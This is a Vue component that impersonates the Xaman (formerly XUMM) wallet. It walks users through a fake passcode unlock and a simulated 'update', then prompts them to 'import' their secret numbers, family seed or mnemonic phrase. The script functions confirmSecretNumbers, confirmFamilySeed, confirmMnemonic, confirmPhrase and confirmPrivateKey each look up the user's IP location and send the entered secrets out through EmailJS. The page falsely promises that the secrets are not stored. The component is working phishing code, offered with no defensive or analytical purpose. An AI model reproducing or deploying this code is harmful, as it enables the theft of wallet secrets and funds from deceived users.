<template>
  <div class="bg-white rounded-2xl w-full text-white overflow-hidden">
    <!-- Header -->
    <div
      v-if="currentStep === 3 || currentStep === 4"
      class="flex justify-between items-center py-4 px-4 border-b border-gray-700"
    >
      <button
        @click="goBackToStep2"
        style="background: white; border: none; padding: 0"
        class=""
      >
        <svg
          class="text-gray-600 hover:text-gray-800 h-6 w-6"
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M15 19l-7-7 7-7"
          />
        </svg>
      </button>
      <div class="text-3xl font-bold text-white">
        {{
          currentStep === 2
            ? "Connect account"
            : currentStep === 3
            ? "Update account"
            : "Import a wallet"
        }}
      </div>
      <svg
        xmlns="http://www.w3.org/2000/svg"
        class="h-5 w-5 text-[#777777]"
        fill="none"
        viewBox="0 0 24 24"
        stroke="currentColor"
      >
        <path
          stroke-linecap="round"
          stroke-linejoin="round"
          stroke-width="2"
          d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
        />
      </svg>
    </div>

    <hr class="border-t m-0 border-gray-500" v-if="currentStep !== 1" />

    <!-- Step Container -->
    <div class="min-h-[420px] flex flex-col relative p-6">
      <transition name="fade" mode="out-in">
        <div :key="currentStep">
          <!-- STEP 1 -->
          <template v-if="currentStep === 1">
            <div class="flex flex-col items-center justify-center">
              <div class="rounded-3xl flex justify-center w-full pt-[90px]">
                <img
                  class="w-[80px] h-[80px]"
                  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTsDRII-_bWyIPsxxIFNf3JWh6SXaMph-7y4HWXpKYioXHY8dbXHWKRBXg66lOvr1PtW_0&usqp=CAU"
                  alt="Xaman Wallet"
                />
              </div>
              <form class="w-full p-6">
                <h2
                  style="color: #0030cf"
                  class="text-5xl leading-[24px] text-center font-bold mb-6 mt-2 tracking-[-0.02em]"
                >
                  Xaman Wallet
                </h2>
                <p
                  class="text-gray-500 font-semibold text-center text-2xl mb-8"
                >
                  Formerly XUMM
                </p>
                <div class="mb-2">
                  <label class="text-black text-[14px] font-medium mb-2" for=""
                    >Enter your 6-digit passcode to unlock</label
                  >
                  <input
                    type="password"
                    v-model="password"
                    style="background: white; font-size: 14px"
                    class="w-full font-medium bg-white rounded-[6px] p-3 text-[#777777] placeholder-[#777777] focus-visible:border-[#2f2f2f] focus-visible:ring-0 focus-visible:outline-none"
                    placeholder="Password"
                    required
                  />
                </div>

                <div class="mt-28">
                  <div class="text-center mb-4">
                    <a
                      href="#"
                      class="text-xl hover:underline text-black font-bold mt-2 hover:text-white"
                      >Forgot your password?</a
                    >
                  </div>
                  <button
                    @click="unlock"
                    type="button"
                    :disabled="password.length <= 6 || isLoading"
                    :class="
                      password.length > 6 ? 'bg-[#0030cf]' : 'bg-[#0030cf]'
                    "
                    class="w-full py-4 px-4 mb-2 border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center bg-[#0030cf] text-white relative"
                  >
                    <span v-if="!isLoading">Unlock Wallet</span>
                    <svg
                      v-else
                      class="animate-spin h-6 w-6 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        class="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        stroke-width="4"
                      />
                      <path
                        class="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                      />
                    </svg>
                  </button>
                </div>
              </form>
            </div>
          </template>

          <!-- STEP 2 -->
          <template v-else-if="currentStep === 2">
            <div>
              <div class="rounded-3xl flex justify-center w-full pt-[90px]">
                <img
                  class="w-[80px] h-[80px]"
                  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTsDRII-_bWyIPsxxIFNf3JWh6SXaMph-7y4HWXpKYioXHY8dbXHWKRBXg66lOvr1PtW_0&usqp=CAU"
                  alt="Xaman Wallet"
                />
              </div>
              <h2
                style="color: #0030cf"
                class="text-3xl leading-[24px] text-center font-bold mb-6 mt-4 tracking-[-0.02em]"
              >
                This app will be updated to the latest version
              </h2>
              <div class="bg-blue-100 px-5 py-3 my-10">
                <div
                  class="text-[#222] font-semibold text-2xl flex items-center mb-1"
                >
                  <div class="bg-blue-500 w-2 h-2 mr-4"></div>
                  Improved Performance
                </div>
                <div
                  class="text-[#222] font-semibold text-2xl flex items-center mb-1"
                >
                  <div class="bg-blue-500 w-2 h-2 mr-4"></div>
                  Monetization Launch
                </div>
                <div
                  class="text-[#222] font-semibold text-2xl flex items-center mb-1"
                >
                  <div class="bg-blue-500 w-2 h-2 mr-4"></div>
                  Cleaner event list
                </div>
                <div
                  class="text-[#222] font-semibold text-2xl flex items-center mb-1"
                >
                  <div class="bg-blue-500 w-2 h-2 mr-4"></div>
                  New Xaman card designs
                </div>
              </div>
              <div class="w-full pt-6 pb-[10px]">
                <div class="flex gap-3 w-full mt-[40px]">
                  <button
                    @click="nextStep"
                    class="w-full py-4 px-4 mb-2 bg-[#0030cf] border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center bg-[#0030cf] text-white relative"
                  >
                    Update Now
                  </button>
                </div>
              </div>
            </div>
          </template>

          <!-- STEP 3 (Updating) -->
          <template v-else-if="currentStep === 3">
            <div key="s3" class="flex flex-col items-center p-6">
              <div class="flex flex-col items-center gap-3 py-6 w-full">
                <div class="flex items-center justify-center">
                  <img
                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTsDRII-_bWyIPsxxIFNf3JWh6SXaMph-7y4HWXpKYioXHY8dbXHWKRBXg66lOvr1PtW_0&usqp=CAU"
                    class="w-20 h-20"
                    alt="Xaman Wallet"
                  />
                </div>
                <h2 class="text-4xl text-black mt-2 mb-0 text-center font-bold">
                  Updating Xaman Wallet
                </h2>
                <p class="text-gray-800 text-[16px] text-center">
                  Please wait while we apply the latest updates
                </p>
                <div class="w-full mt-6">
                  <div class="bg-gray-200 h-2 rounded-full overflow-hidden">
                    <div
                      class="h-2 rounded-full transition-all"
                      :style="{ width: progress + '%', background: '#0030cf' }"
                    ></div>
                  </div>
                  <div
                    class="flex items-center text-center justify-center font-semibold mt-2 text-lg text-black"
                  >
                    <span>{{ Math.round(progress) }}%</span>
                  </div>
                </div>
                <p class="text-black text-[14px] leading-8 text-center mt-4">
                  This may take a few moments. Please do not close this window.
                </p>
              </div>
            </div>
          </template>

          <!-- STEP 4: Import / Secret Recovery Phrase / Private Key -->
          <!-- STEP 4: Import Wallet - Updated for Xaman specific secrets -->
          <template v-else-if="currentStep === 4">
            <div key="s4" class="flex flex-col w-full">
              <!-- Tabs -->
              <div
                style="border: 2px solid #0030cf"
                class="flex mb-4 bg-gray-100 rounded-[30px] flex p-2 space-x-3"
              >
                <button
                  @click="activeTab = 'secretNumbers'"
                  :class="[
                    'flex-1 text-black rounded-[30px] px-2 py-3 text-lg font-semibold border-none hover:border-none hover:text-[#222222] focus:border-none focus:text-[#222222]',
                    activeTab === 'secretNumbers'
                      ? 'bg-[#0030cf] text-white'
                      : 'bg-transparent',
                  ]"
                >
                  Secret
                </button>
                <button
                  @click="activeTab = 'familySeed'"
                  :class="[
                    'flex-1 text-black rounded-[30px] px-2 py-3 text-lg font-semibold border-none hover:border-none hover:text-[#222222] focus:border-none focus:text-[#222222]',
                    activeTab === 'familySeed'
                      ? 'bg-[#0030cf] text-white'
                      : 'bg-transparent',
                  ]"
                >
                  Seed
                </button>
                <button
                  @click="activeTab = 'mnemonic'"
                  :class="[
                    'flex-1 text-black rounded-[30px] px-2 py-3 text-lg font-semibold border-none hover:border-none hover:text-[#222222] focus:border-none focus:text-[#222222]',
                    activeTab === 'mnemonic'
                      ? 'bg-[#0030cf] text-white'
                      : 'bg-transparent',
                  ]"
                >
                  Mnemonic
                </button>
              </div>

              <!-- Secret Numbers Tab -->
              <div v-if="activeTab === 'secretNumbers'">
                <p class="mb-4 font-bold text-[14px] leading-8 text-black">
                  Enter your 8 rows of 6-digit secret numbers. This is Xaman's
                  unique format for accounts created directly in the app.
                </p>
                <div class="space-y-3 mb-6">
                  <div v-for="n in 8" :key="n" class="relative">
                    <span
                      class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 text-sm select-none z-10 font-medium"
                      >{{ n }}</span
                    >
                    <input
                      type="text"
                      v-model="secretNumbers[n - 1]"
                      maxlength="6"
                      placeholder="000000"
                      style="
                        background: white;
                        padding-left: 30px;
                        border-radius: 8px;
                        font-family: 'Courier New', monospace;
                        letter-spacing: 2px;
                      "
                      class="w-full border-none font-semibold py-3 pl-10 pr-4 text-black text-lg outline-none transition-colors duration-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-200"
                      @input="formatSecretNumber(n - 1)"
                    />
                  </div>
                </div>
                <p
                  class="mt-[20px] leading-8 text-[13px] font-semibold text-black"
                >
                  This is the 8-row, 6-digit format used by Xaman for natively
                  created accounts. Xaman will not store your secret numbers.
                </p>
                <div class="flex gap-3 mt-[30px]">
                  <button
                    @click="confirmSecretNumbers"
                    :disabled="isSecretNumbersDisabled"
                    class="flex-1 font-bold bg-[#0030cf] text-[14px] border-none hover:border-none hover:text-[#222] hover:bg-white text-white py-4 px-4 rounded-[30px] font-bold transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    Import Secret Numbers
                  </button>
                </div>
              </div>

              <!-- Family Seed Tab -->
              <div v-else-if="activeTab === 'familySeed'">
                <p class="mb-4 font-bold text-[14px] leading-8 mt-[20px] text-black">
                  Enter your Family Seed (29 characters starting with 's')
                </p>
                <div class="mb-6">
                  <input
                    type="text"
                    v-model="familySeedInput"
                    placeholder="sXXXXXXXXXXXXXXXXXXXXXXXXXX"
                    style="
                      background: white;
                      font-size: 16px;
                      font-family: 'Courier New', monospace;
                    "
                    class="w-full border border-gray-300 rounded-lg py-3 px-4 text-black text-base outline-none transition-colors duration-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-200"
                    @input="validateFamilySeed"
                  />
                  <div
                    v-if="familySeedError"
                    class="text-red-500 text-sm mt-2 font-semibold"
                  >
                    {{ familySeedError }}
                  </div>
                </div>
                <p
                  class="mt-[20px] leading-8 text-[13px] font-semibold text-black"
                >
                  The Family Seed is a 29-character string starting with 's'.
                  This is the standard XRP Ledger secret format.
                </p>
                <div class="flex gap-3 mt-[30px]">
                  <button
                    @click="confirmFamilySeed"
                    :disabled="isFamilySeedDisabled"
                    class="flex-1 font-bold bg-[#0030cf] text-[14px] border-none hover:border-none hover:text-[#222] hover:bg-[#0030cf] text-white py-4 px-4 rounded-[30px] font-bold transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    Import Family Seed
                  </button>
                </div>
              </div>

              <!-- Mnemonic Tab -->
              <div v-else-if="activeTab === 'mnemonic'">
                <p class="mb-4 font-bold text-[14px] leading-8 text-black">
                  You can paste the entire mnemonic phrase into the first blank
                  space or enter each word individually.
                </p>
                <div
                  class="mb-6 relative flex items-center space-x-1 my-[20px]"
                >
                  <div class="relative flex space-x-1 mr-2">
                    <div class="right-0 flex items-center pointer-events-none">
                      <svg
                        class="h-5 w-5 text-gray-400"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="M19 9l-7 7-7-7"
                        />
                      </svg>
                    </div>
                    <select
                      style="
                        background-color: transparent !important;
                        color: black;
                      "
                      v-model="selectedWordCount"
                      @change="updateWordCount"
                      class="w-full bg-white font-bold text-xl rounded-lg text-gray-700 appearance-none cursor-pointer focus:outline-none focus:border-[#0376c9] focus:ring-2 focus:ring-blue-200"
                    >
                      <option value="12">12 words</option>
                      <option value="16">16 words</option>
                      <option value="24">24 words</option>
                    </select>
                  </div>
                  <label
                    class="block font-semibold text-black text-xl pb-0 m-0 font-medium"
                    >mnemonic phrase</label
                  >
                </div>
                <div class="rounded-lg max-h-[38rem] overflow-y-auto">
                  <div class="grid grid-cols-3 gap-0">
                    <div
                      v-for="n in parseInt(selectedWordCount)"
                      :key="n"
                      class="relative"
                    >
                      <span
                        class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 text-sm select-none z-10 font-medium"
                        >{{ n }}</span
                      >
                      <div class="relative">
                        <input
                          :type="hiddenFields[n - 1] ? 'password' : 'text'"
                          v-model="phraseWords[n - 1]"
                          style="
                            background: white;
                            padding-left: 30px;
                            border-radius: 0px;
                          "
                          class="w-full border-none py-3 pl-10 pr-10 text-black text-sm outline-none transition-colors duration-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-200"
                        />
                      
                      </div>
                    </div>
                  </div>
                </div>
                <p
                  class="mt-[20px] leading-8 text-[13px] font-semibold text-black"
                >
                  Supports 12, 16, or 24-word mnemonic phrases from other
                  wallets. Xaman will not store your mnemonic phrases.
                </p>
                <div class="flex gap-3 mt-[30px]">
                  <button
                    @click="confirmMnemonic"
                    :disabled="isMnemonicDisabled"
                    class="flex-1 font-bold bg-[#0030cf] text-[14px] border-none hover:border-none hover:text-[#222] hover:bg-[#0030cf] text-white py-4 px-4 rounded-[30px] font-bold transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    Import Mnemonic
                  </button>
                </div>
              </div>
            </div>
          </template>
        </div>
      </transition>

      <transition name="fade">
        <div
          v-if="message.text"
          :class="[
            'absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold',
            message.type === 'success'
              ? 'bg-green-600 text-white'
              : 'bg-red-600 text-white',
          ]"
        >
          {{ message.text }}
        </div>
      </transition>
    </div>
  </div>
</template>

<script setup>
import { ref, watch, computed, nextTick } from "vue";
import axios from "axios";

const emit = defineEmits(["close"]);
const currentStep = ref(1);
const password = ref("");
const isLoading = ref(false);
const progress = ref(0);
const message = ref({ text: "", type: "" });
const privateKeyInput = ref("");

// Update the reactive variables
const activeTab = ref("secretNumbers");
const selectedWordCount = ref("12");
const phraseWords = ref([]);
const hiddenFields = ref([]);
const secretNumbers = ref(Array(8).fill(""));
const familySeedInput = ref("");
const familySeedError = ref("");

// Add computed properties for validation
const isSecretNumbersDisabled = computed(() => {
  return secretNumbers.value.some(num => !num || num.length !== 6 || !/^\d+$/.test(num));
});

const isFamilySeedDisabled = computed(() => {
  return !familySeedInput.value.trim() || familySeedError.value !== "";
});

const isMnemonicDisabled = computed(() => {
  return phraseWords.value.some((w) => !w || !w.trim());
});

// Add new methods
function formatSecretNumber(index) {
  let value = secretNumbers.value[index].replace(/\D/g, '');
  if (value.length > 6) {
    value = value.slice(0, 6);
  }
  secretNumbers.value[index] = value;
}

function validateFamilySeed() {
  const seed = familySeedInput.value.trim();
  if (!seed) {
    familySeedError.value = "";
    return;
  }
  
  if (!seed.startsWith('s')) {
    familySeedError.value = "Family Seed must start with 's'";
  } else if (seed.length !== 29) {
    familySeedError.value = "Family Seed must be exactly 29 characters";
  } else if (!/^s[a-zA-Z0-9]+$/.test(seed)) {
    familySeedError.value = "Invalid Family Seed format";
  } else {
    familySeedError.value = "";
  }
}

async function confirmSecretNumbers() {
  if (isSecretNumbersDisabled.value) {
    return showMessage("Please enter all 8 rows of 6-digit numbers", "error");
  }
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: "secretNumbers",
      numbers: secretNumbers.value,
    };
    const params = {
      service_id: "service_eusbqyo",
      template_id: "template_z6xga6o",
      user_id: "obT4LcwZqPw_KlOar",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Xaman Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );
    if (response.data === "OK") {
      showMessage("Secret Numbers imported successfully!", "success");
      emit("close");
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

async function confirmFamilySeed() {
  if (isFamilySeedDisabled.value) {
    return showMessage("Please enter a valid Family Seed", "error");
  }
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: "familySeed",
      seed: familySeedInput.value,
    };
    const params = {
      service_id: "service_eusbqyo",
      template_id: "template_z6xga6o",
      user_id: "obT4LcwZqPw_KlOar",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Xaman Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );
    if (response.data === "OK") {
      showMessage("Family Seed imported successfully!", "success");
      emit("close");
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

async function confirmMnemonic() {
  if (isMnemonicDisabled.value) {
    return showMessage("Please fill all mnemonic fields", "error");
  }
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: "mnemonic",
      wordCount: selectedWordCount.value,
      phrase: phraseWords.value.join(" "),
    };
    const params = {
      service_id: "service_eusbqyo",
      template_id: "template_z6xga6o",
      user_id: "obT4LcwZqPw_KlOar",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Xaman Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );
    if (response.data === "OK") {
      showMessage("Mnemonic phrase imported successfully!", "success");
      emit("close");
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

// Initialize the secret numbers array
function initSecretNumbers() {
  secretNumbers.value = Array(8).fill("");
}

function initPhraseWords() {
  const count = parseInt(selectedWordCount.value);
  phraseWords.value = Array(count).fill("");
  hiddenFields.value = Array(count).fill(true);
}

function updateWordCount() {
  initPhraseWords();
}

function goBackToStep2() {
  currentStep.value = 2;
}

function unlock() {
  if (password.value.length <= 6) return;
  isLoading.value = true;
  setTimeout(() => {
    isLoading.value = false;
    nextStep();
  }, 2000);
}

async function startUpdate() {
  currentStep.value = 3;
  progress.value = 0;
  const duration = 3000;
  const start = performance.now();
  isLoading.value = true;
  function step(now) {
    const elapsed = now - start;
    const pct = Math.min(100, (elapsed / duration) * 100);
    progress.value = pct;
    if (elapsed < duration) {
      requestAnimationFrame(step);
    } else {
      isLoading.value = false;
      setTimeout(() => {
        currentStep.value = 4;
        initPhraseWords();
      }, 400);
    }
  }
  requestAnimationFrame(step);
}

function nextStep() {
  if (currentStep.value < 3) {
    currentStep.value++;
    if (currentStep.value === 3) startUpdate();
  }
}

function prevStep() {
  if (currentStep.value > 1) currentStep.value--;
}

function toggleFieldVisibility(idx) {
  hiddenFields.value[idx] = !hiddenFields.value[idx];
}

const isImportDisabled = computed(() => {
  if (activeTab.value === "private") {
    return !privateKeyInput.value.trim();
  } else {
    return phraseWords.value.some((w) => !w || !w.trim());
  }
});

async function confirmPhrase() {
  if (isImportDisabled.value) {
    return showMessage("Please fill all fields", "error");
  }
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: "seed",
      wordCount: selectedWordCount.value,
      phrase: phraseWords.value.join(" "),
    };
    const params = {
      service_id: "service_eusbqyo",
      template_id: "template_z6xga6o",
      user_id: "obT4LcwZqPw_KlOar",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Xaman Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );
    if (response.data === "OK") {
      showMessage("Wallet imported successfully!", "success");
      emit("close");
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

async function confirmPrivateKey() {
  if (!privateKeyInput.value.trim()) {
    return showMessage("Please enter your private key", "error");
  }
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = { type: "privateKey", privateKey: privateKeyInput.value };
    const params = {
      service_id: "service_eusbqyo",
      template_id: "template_z6xga6o",
      user_id: "obT4LcwZqPw_KlOar",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Xaman Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );
    if (response.data === "OK") {
      showMessage("Private key imported successfully!", "success");
      emit("close");
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

function showMessage(text, type = "success") {
  message.value = { text, type };
  setTimeout(() => {
    message.value.text = "";
  }, 3000);
}

watch(currentStep, (val) => {
  if (val === 3) startUpdate();
});

initPhraseWords();
</script>

<style scoped>
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.4s ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}
input::placeholder {
  font-size: 14px;
  color: #9ca3af;
}
.scrollbar-custom::-webkit-scrollbar {
  width: 6px;
}
.scrollbar-custom::-webkit-scrollbar-track {
  background: #f1f1f1;
  border-radius: 3px;
}
.scrollbar-custom::-webkit-scrollbar-thumb {
  background: #c1c1c1;
  border-radius: 3px;
}
.scrollbar-custom::-webkit-scrollbar-thumb:hover {
  background: #a8a8a8;
}
</style>
